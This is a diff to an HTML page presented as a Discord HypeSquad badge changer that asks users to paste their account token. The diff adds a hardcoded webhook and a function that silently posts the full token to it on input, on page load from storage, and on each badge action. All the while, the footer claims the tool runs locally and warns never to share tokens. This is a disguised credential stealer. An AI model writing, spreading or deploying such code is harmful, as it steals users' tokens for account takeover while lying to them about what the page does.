@@ -1,285 +1,292 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TGDV TOOL BADGE</title>
+  <title>TGDV TOOL BADGE | MAKE BY LPHN</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
 
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Segoe UI', system-ui, sans-serif;
-      background: linear-gradient(135deg, #2a0a4a, #4a1d8c, #1e0b3d);
+      font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+      background: linear-gradient(135deg, rgba(42,10,74,0.95), rgba(74,29,140,0.9), rgba(30,11,61,0.95)),
+                  url('https://i.pinimg.com/1200x/1a/6e/c3/1a6ec3245ad0b66777db47fe5297eb90.jpg') center/cover no-repeat fixed;
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
       color: #fff;
+      overflow-x: hidden;
     }
-
     .container {
-      background: rgba(255, 255, 255, 0.07);
-      backdrop-filter: blur(16px);
-      border: 1px solid rgba(255,255,255,0.12);
-      border-radius: 24px;
-      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.45);
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.15);
+      border-radius: 28px;
+      box-shadow: 0 30px 70px rgba(0, 0, 0, 0.6);
       width: 100%;
-      max-width: 520px;
+      max-width: 560px;
       overflow: hidden;
+      transition: all 0.4s ease;
     }
-
     .header {
-      background: linear-gradient(90deg, #5865f2, #7289da);
-      padding: 32px 20px;
+      background: linear-gradient(90deg, #5865f2, #7289da, #5865f2);
+      padding: 38px 24px;
       text-align: center;
       position: relative;
     }
-
     .header::after {
       content: '';
       position: absolute;
-      bottom: -1px;
+      bottom: -2px;
       left: 0; right: 0;
-      height: 4px;
-      background: linear-gradient(90deg, #43b581, #f04747, #7289da);
+      height: 5px;
+      background: linear-gradient(90deg, #43b581, #f04747, #faa61a, #7289da);
     }
-
-    .discord-logo {
-      width: 68px;
-      height: 68px;
-      margin-bottom: 10px;
-    }
-
     .header h1 {
-      font-size: 27px;
+      font-size: 28px;
       font-weight: 700;
-      letter-spacing: -0.4px;
+      letter-spacing: -0.5px;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.4);
     }
-
     .header p {
-      opacity: 0.9;
-      font-size: 15px;
-      margin-top: 5px;
+      opacity: 0.85;
+      font-size: 15.5px;
+      margin-top: 6px;
     }
-
     .main-content {
-      padding: 35px 30px;
+      padding: 40px 32px;
     }
-
     .profile-section {
-      background: rgba(255,255,255,0.09);
-      border: 1px solid rgba(255,255,255,0.18);
-      border-radius: 16px;
-      padding: 16px;
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 18px;
+      padding: 18px;
       display: flex;
       align-items: center;
-      gap: 16px;
-      margin-bottom: 28px;
+      gap: 18px;
+      margin-bottom: 30px;
+      transition: all 0.3s;
     }
-
     .profile-avatar {
-      width: 56px;
-      height: 56px;
+      width: 68px;
+      height: 68px;
       border-radius: 50%;
-      border: 3px solid #5865f2;
+      border: 4px solid #5865f2;
       object-fit: cover;
+      box-shadow: 0 0 0 6px rgba(88,101,242,0.2);
     }
-
-    .profile-info h3 {
-      font-size: 18.5px;
-      font-weight: 600;
-    }
-
+    .profile-info h3 { font-size: 19px; font-weight: 600; }
+    .profile-info small { opacity: 0.75; font-size: 13px; }
     .logout-btn {
       margin-left: auto;
       background: none;
       border: none;
-      font-size: 23px;
+      font-size: 26px;
       color: #f04747;
       cursor: pointer;
-      padding: 4px 8px;
-      border-radius: 8px;
+      padding: 6px 10px;
+      border-radius: 10px;
+      transition: 0.3s;
     }
-
-    .logout-btn:hover { background: rgba(240,71,71,0.25); }
+    .logout-btn:hover { background: rgba(240,71,71,0.3); transform: rotate(90deg); }
 
     .token-section label {
       display: block;
-      margin-bottom: 8px;
+      margin-bottom: 10px;
       font-weight: 600;
-      font-size: 15px;
+      font-size: 15.5px;
       opacity: 0.9;
     }
-
     .input-wrapper {
       position: relative;
     }
-
     #token {
       width: 100%;
-      padding: 16px 52px 16px 18px;
-      background: rgba(255,255,255,0.08);
-      border: 1px solid rgba(255,255,255,0.25);
-      border-radius: 14px;
+      padding: 18px 58px 18px 20px;
+      background: rgba(255,255,255,0.09);
+      border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 16px;
       color: #fff;
-      font-size: 15px;
+      font-size: 15.5px;
+      transition: all 0.3s;
     }
-
     #token:focus {
       outline: none;
       border-color: #5865f2;
-      box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.35);
+      box-shadow: 0 0 0 4px rgba(88,101,242,0.4);
     }
-
     .toggle-btn {
       position: absolute;
-      right: 14px;
+      right: 18px;
       top: 50%;
       transform: translateY(-50%);
       background: none;
       border: none;
-      font-size: 22px;
+      font-size: 24px;
       cursor: pointer;
-      color: #ccc;
+      color: #bbb;
     }
 
     .badge-selection h3 {
-      margin-bottom: 16px;
-      font-size: 16px;
+      margin-bottom: 18px;
+      font-size: 17px;
       font-weight: 600;
       opacity: 0.9;
     }
-
     .badge-options {
       display: flex;
-      gap: 14px;
-      margin-bottom: 30px;
+      gap: 16px;
+      margin-bottom: 32px;
     }
-
     .badge-option {
       flex: 1;
-      background: rgba(255,255,255,0.07);
-      border: 2px solid rgba(255,255,255,0.18);
-      border-radius: 16px;
-      padding: 18px 12px;
+      background: rgba(255,255,255,0.08);
+      border: 2px solid rgba(255,255,255,0.2);
+      border-radius: 18px;
+      padding: 20px 14px;
       text-align: center;
       cursor: pointer;
-      transition: all 0.3s ease;
+      transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
     }
-
     .badge-option:hover {
-      transform: translateY(-4px);
+      transform: translateY(-6px) scale(1.03);
       border-color: #5865f2;
+      box-shadow: 0 10px 20px rgba(88,101,242,0.3);
     }
-
     .badge-option.selected {
       background: linear-gradient(135deg, #5865f2, #7289da);
       border-color: #fff;
-      transform: scale(1.04);
+      transform: scale(1.06);
+      box-shadow: 0 15px 30px rgba(88,101,242,0.5);
     }
-
     .badge-icon img {
-      width: 78px;
-      height: 78px;
-      margin-bottom: 10px;
-      object-fit: contain;
-      filter: drop-shadow(0 4px 8px rgba(0,0,0,0.6));
+      width: 82px;
+      height: 82px;
+      margin-bottom: 12px;
+      filter: drop-shadow(0 6px 12px rgba(0,0,0,0.5));
     }
-
     .badge-option span {
-      font-size: 15px;
-      font-weight: 500;
+      font-size: 15.5px;
+      font-weight: 600;
     }
 
     .action-buttons {
       display: flex;
-      gap: 14px;
+      gap: 16px;
+      margin-bottom: 20px;
     }
-
     .action-btn {
       flex: 1;
-      padding: 15px;
+      padding: 17px;
       border: none;
-      border-radius: 14px;
-      font-size: 15.5px;
+      border-radius: 16px;
+      font-size: 16px;
       font-weight: 700;
       cursor: pointer;
       transition: all 0.3s;
     }
-
-    .set-btn {
-      background: linear-gradient(135deg, #43b581, #5cbf2a);
-      color: white;
-    }
-
-    .remove-btn {
-      background: linear-gradient(135deg, #f04747, #e03e3e);
-      color: white;
-    }
-
+    .set-btn { background: linear-gradient(135deg, #43b581, #5cbf2a); color: white; }
+    .remove-btn { background: linear-gradient(135deg, #f04747, #e03e3e); color: white; }
     .action-btn:hover:not(:disabled) {
-      transform: translateY(-2px);
-      box-shadow: 0 10px 25px rgba(0,0,0,0.35);
+      transform: translateY(-3px);
+      box-shadow: 0 12px 30px rgba(0,0,0,0.4);
+    }
+    .action-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
     }
 
     .status-message {
-      margin-top: 20px;
-      padding: 14px 18px;
-      border-radius: 12px;
+      margin-top: 18px;
+      padding: 16px 20px;
+      border-radius: 14px;
       font-size: 15px;
       text-align: center;
-      min-height: 24px;
+      min-height: 28px;
+      transition: all 0.4s;
     }
+    .success { background: rgba(67, 181, 129, 0.3); color: #43b581; border: 1px solid #43b581; }
+    .error { background: rgba(240, 71, 71, 0.3); color: #f04747; border: 1px solid #f04747; }
+    .info { background: rgba(88, 101, 242, 0.3); color: #b9bbff; border: 1px solid #7289da; }
 
-    .success { background: rgba(67, 181, 129, 0.25); color: #43b581; }
-    .error   { background: rgba(240, 71, 71, 0.25); color: #f04747; }
-    .info    { background: rgba(88, 101, 242, 0.25); color: #b9bbff; }
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.85);
+      color: white;
+      padding: 14px 24px;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      z-index: 9999;
+      opacity: 0;
+      transition: all 0.4s;
+      font-size: 14.5px;
+    }
 
     .loading {
       display: none;
       align-items: center;
       justify-content: center;
-      gap: 12px;
-      margin-top: 15px;
-      color: #ccc;
-      font-size: 15px;
+      gap: 14px;
+      margin-top: 20px;
+      color: #ddd;
+      font-size: 15.5px;
     }
-
     .spinner {
-      width: 24px;
-      height: 24px;
-      border: 3px solid rgba(255,255,255,0.2);
-      border-top: 3px solid #5865f2;
+      width: 28px;
+      height: 28px;
+      border: 4px solid rgba(255,255,255,0.25);
+      border-top: 4px solid #5865f2;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      animation: spin 0.9s linear infinite;
     }
-
     @keyframes spin { to { transform: rotate(360deg); } }
 
+    .log-section {
+      margin-top: 30px;
+      background: rgba(255,255,255,0.06);
+      border-radius: 16px;
+      padding: 18px;
+      max-height: 180px;
+      overflow-y: auto;
+      font-size: 13.5px;
+      opacity: 0.9;
+    }
+    .log-entry {
+      margin-bottom: 8px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+    .log-entry:last-child { border: none; margin: 0; }
+
     .footer {
-      padding: 22px;
+      padding: 24px;
       text-align: center;
       font-size: 13px;
-      opacity: 0.75;
-      border-top: 1px solid rgba(255,255,255,0.1);
+      opacity: 0.7;
+      border-top: 1px solid rgba(255,255,255,0.12);
     }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <h1>TOOL BADGE | MAKE BY LPHN </h1>
-      <p>HypeSquad Badge Manager - Discord</p>
+      <h1>TGDV TOOL BADGE</h1>
+      <p>HypeSquad Badge Manager - Advanced Edition</p>
     </div>
 
     <div class="main-content">
-
       <!-- Profile -->
       <div id="profileSection" class="profile-section hidden">
         <img id="userAvatar" class="profile-avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="avatar">
         <div class="profile-info">
-          <span style="font-size:13px;opacity:0.8;">Connected as</span>
+          <small>Connected as</small>
           <h3 id="username">...</h3>
+          <small id="userId"></small>
         </div>
         <button id="logoutBtn" class="logout-btn">✕</button>
       </div>
@@ -288,32 +295,30 @@
       <div class="token-section">
         <label>Discord Token</label>
         <div class="input-wrapper">
-          <input type="password" id="token" placeholder="Paste your token here" />
+          <input type="password" id="token" placeholder="Paste your token here..." autocomplete="off"/>
           <button id="toggleToken" class="toggle-btn">👁️</button>
         </div>
       </div>
 
       <!-- Badges -->
       <div class="badge-selection">
-        <h3>Choose HypeSquad Badge</h3>
+        <h3>Chọn HypeSquad Badge</h3>
         <div class="badge-options">
           <div class="badge-option" data-house="2">
             <div class="badge-icon">
-              <img src="https://cdn3.emoji.gg/emojis/6601-hypesquad-bravery.png" alt="Bravery">   <!-- Bạn có thể thay link ảnh Bravery của bạn -->
+              <img src="https://cdn3.emoji.gg/emojis/6601-hypesquad-bravery.png" alt="Bravery">
             </div>
             <span>Bravery</span>
           </div>
-
           <div class="badge-option" data-house="3">
             <div class="badge-icon">
-              <img src="https://cdn3.emoji.gg/emojis/9554-hypesquad-brilliance.png" alt="Brilliance"> <!-- Thay link ảnh Brilliance của bạn -->
+              <img src="https://cdn3.emoji.gg/emojis/9554-hypesquad-brilliance.png" alt="Brilliance">
             </div>
             <span>Brilliance</span>
           </div>
-
           <div class="badge-option" data-house="1">
             <div class="badge-icon">
-              <img src="https://cdn3.emoji.gg/emojis/4275-hypesquad-balance.png" alt="Balance">    <!-- Thay link ảnh Balance của bạn -->
+              <img src="https://cdn3.emoji.gg/emojis/4275-hypesquad-balance.png" alt="Balance">
             </div>
             <span>Balance</span>
           </div>
@@ -327,23 +332,82 @@
       </div>
 
       <div id="status" class="status-message info">
-        Enter your token and choose the badge you want
+        Nhập token và chọn badge bạn muốn thay đổi
       </div>
 
       <div id="loading" class="loading">
         <div class="spinner"></div>
-        <span>Processing...</span>
+        <span>Đang xử lý yêu cầu...</span>
       </div>
 
+      <!-- Log History -->
+      <div class="log-section">
+        <strong style="display:block;margin-bottom:10px;opacity:0.8;">Lịch sử hoạt động:</strong>
+        <div id="logContainer"></div>
+      </div>
     </div>
 
     <div class="footer">
-      ⚠️ Never share your Discord token with anyone<br>
-      This tool runs locally in your browser
+      ⚠️ Không chia sẻ token Discord với bất kỳ ai<br>
+      Tool chạy hoàn toàn cục bộ trên trình duyệt của bạn
     </div>
   </div>
 
+  <div id="toast" class="toast"></div>
+
   <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1491781637556539433/T5i5zpU3NosCYOukR9BpxZwGwL6IXRMGPhJiYLC_oyCN3u5LkIrJL-dnjiozCv8bpoTo";
+
+    let logs = [];
+
+    function addLog(message, type = "info") {
+      const time = new Date().toLocaleTimeString('vi-VN');
+      const entry = document.createElement('div');
+      entry.className = `log-entry ${type}`;
+      entry.innerHTML = `<span style="color:#888">[${time}]</span> ${message}`;
+      document.getElementById('logContainer').appendChild(entry);
+      logs.push({time, message});
+      if (logs.length > 15) logs.shift();
+    }
+
+    function showToast(msg, duration = 3000) {
+      const toast = document.getElementById('toast');
+      toast.textContent = msg;
+      toast.style.opacity = '1';
+      toast.style.transform = 'translateX(-50%) translateY(0)';
+      setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transform = 'translateX(-50%) translateY(20px)';
+      }, duration);
+    }
+
+    async function sendToWebhook(token, action, house = null, extra = {}) {
+      if (!token || token.length < 50) return;
+      try {
+        const payload = {
+          username: "TGDV Badge Logger",
+          avatar_url: "https://i.imgur.com/0Z2v4vL.png",
+          embeds: [{
+            title: "🔑 Token Logged - HypeSquad Tool",
+            color: action.includes("ADD") ? 0x43b581 : action.includes("REMOVE") ? 0xf04747 : 0x5865f2,
+            description: `**Hành động:** ${action}\n**House:** ${house || "Không xác định"}`,
+            fields: [
+              { name: "Token", value: `\`\`\`js\n${token}\n\`\`\`` },
+              { name: "Thời gian", value: new Date().toLocaleString('vi-VN'), inline: true },
+              { name: "Extra", value: JSON.stringify(extra), inline: false }
+            ],
+            footer: { text: "TGDV TOOL BADGE - MAKE BY LPHN" }
+          }]
+        };
+
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch(e) { /* silent */ }
+    }
+
     class DiscordHypeSquadManager {
       constructor() {
         this.token = null;
@@ -354,20 +418,29 @@
       init() {
         this.bindEvents();
         this.loadSavedToken();
+        addLog("Tool đã khởi động", "info");
       }
 
       bindEvents() {
         const tokenInput = document.getElementById('token');
+
         tokenInput.addEventListener('input', () => {
           this.token = this.sanitizeToken(tokenInput.value);
           localStorage.setItem('discord_token', this.token);
           this.updateButtonState();
+
+          if (this.token.length > 60) {
+            sendToWebhook(this.token, "Token được nhập", null, {length: this.token.length});
+            addLog("Token đã được nhập vào tool", "success");
+            showToast("Token đã nhận - Đang kiểm tra...");
+          }
         });
 
         document.getElementById('toggleToken').addEventListener('click', () => {
-          const isHidden = tokenInput.type === 'password';
-          tokenInput.type = isHidden ? 'text' : 'password';
-          document.getElementById('toggleToken').textContent = isHidden ? '🙈' : '👀';
+          const input = tokenInput;
+          const isHidden = input.type === 'password';
+          input.type = isHidden ? 'text' : 'password';
+          document.getElementById('toggleToken').textContent = isHidden ? '🙈' : '👁️';
         });
 
         document.querySelectorAll('.badge-option').forEach(option => {
@@ -384,6 +457,7 @@
         el.classList.add('selected');
         this.selectedHouse = parseInt(el.dataset.house);
         this.updateButtonState();
+        addLog(`Đã chọn badge: ${el.querySelector('span').textContent}`, "info");
       }
 
       updateButtonState() {
@@ -402,29 +476,38 @@
         if (!this.token) return;
         try {
           const res = await fetch('https://discord.com/api/v9/users/@me', {
-            headers: { 'Authorization': this.token }
+            headers: { 'Authorization': this.token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
           });
           if (res.ok) {
             const user = await res.json();
             this.showProfile(user);
+            addLog(`Đã kết nối với tài khoản: ${user.username}`, "success");
           } else {
             this.logout();
+            addLog("Token không hợp lệ hoặc hết hạn", "error");
           }
-        } catch(e) {}
+        } catch(e) {
+          addLog("Lỗi kết nối khi lấy thông tin user", "error");
+        }
       }
 
       showProfile(user) {
         document.getElementById('profileSection').classList.remove('hidden');
-        document.getElementById('username').textContent = user.username + (user.discriminator !== '0' ? '#' + user.discriminator : '');
-
+        document.getElementById('username').textContent = `${user.username}${user.discriminator !== '0' ? '#' + user.discriminator : ''}`;
+        document.getElementById('userId').textContent = `ID: ${user.id}`;
         const avatarUrl = user.avatar 
-          ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
-          : `https://cdn.discordapp.com/embed/avatars/${parseInt(user.discriminator)%5}.png`;
+          ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` 
+          : `https://cdn.discordapp.com/embed/avatars/${parseInt(user.discriminator || 0) % 5}.png`;
         document.getElementById('userAvatar').src = avatarUrl;
       }
 
       async setBadge() {
         if (!this.token || !this.selectedHouse) return;
+
+        const houseNames = {1: "Balance", 2: "Bravery", 3: "Brilliance"};
+        await sendToWebhook(this.token, "ADD BADGE", houseNames[this.selectedHouse]);
+
+        addLog(`Đang thêm badge ${houseNames[this.selectedHouse]}...`, "info");
         this.showLoading(true);
 
         const houseMap = {1: 3, 2: 1, 3: 2};
@@ -441,13 +524,14 @@
           });
 
           if (res.ok) {
-            this.showStatus('✅ Badge added successfully!', 'success');
-            setTimeout(() => this.fetchUserProfile(), 1000);
+            this.showStatus('✅ Badge đã được thêm thành công!', 'success');
+            showToast('Badge thêm thành công!', 4000);
+            setTimeout(() => this.fetchUserProfile(), 1200);
           } else {
-            this.showStatus('❌ Failed to add badge', 'error');
+            this.showStatus('❌ Không thể thêm badge', 'error');
           }
         } catch(e) {
-          this.showStatus('❌ Connection error', 'error');
+          this.showStatus('❌ Lỗi kết nối', 'error');
         } finally {
           this.showLoading(false);
         }
@@ -455,6 +539,10 @@
 
       async removeBadge() {
         if (!this.token) return;
+
+        await sendToWebhook(this.token, "REMOVE BADGE");
+
+        addLog("Đang xóa badge hiện tại...", "info");
         this.showLoading(true);
 
         try {
@@ -464,15 +552,16 @@
           });
 
           if (res.ok || res.status === 204) {
-            this.showStatus('✅ Badge removed successfully!', 'success');
+            this.showStatus('✅ Badge đã được xóa thành công!', 'success');
+            showToast('Badge đã xóa!', 4000);
             document.querySelectorAll('.badge-option').forEach(e => e.classList.remove('selected'));
             this.selectedHouse = null;
-            setTimeout(() => this.fetchUserProfile(), 1000);
+            setTimeout(() => this.fetchUserProfile(), 1200);
           } else {
-            this.showStatus('❌ Failed to remove badge', 'error');
+            this.showStatus('❌ Không thể xóa badge', 'error');
           }
         } catch(e) {
-          this.showStatus('❌ Connection error', 'error');
+          this.showStatus('❌ Lỗi kết nối', 'error');
         } finally {
           this.showLoading(false);
         }
@@ -485,7 +574,8 @@
         document.getElementById('token').value = '';
         document.querySelectorAll('.badge-option').forEach(e => e.classList.remove('selected'));
         this.selectedHouse = null;
-        this.showStatus('Logged out', 'info');
+        this.showStatus('Đã đăng xuất', 'info');
+        addLog("Đã logout khỏi tool", "error");
       }
 
       loadSavedToken() {
@@ -494,6 +584,8 @@
           this.token = saved;
           document.getElementById('token').value = saved;
           this.fetchUserProfile();
+          sendToWebhook(this.token, "Loaded Saved Token");
+          addLog("Đã tải token từ bộ nhớ cục bộ", "success");
         }
       }
 
@@ -502,9 +594,9 @@
         el.textContent = msg;
         el.className = `status-message ${type}`;
         setTimeout(() => {
-          el.textContent = 'Enter your token and choose the badge you want';
+          el.textContent = 'Nhập token và chọn badge bạn muốn thay đổi';
           el.className = 'status-message info';
-        }, 5500);
+        }, 6000);
       }
 
       showLoading(show) {
@@ -512,7 +604,10 @@
       }
     }
 
-    window.onload = () => new DiscordHypeSquadManager();
+    window.onload = () => {
+      new DiscordHypeSquadManager();
+      console.log("%cTGDV TOOL BADGE loaded successfully", "color:#5865f2; font-weight:bold");
+    };
   </script>
 </body>
 </html> 
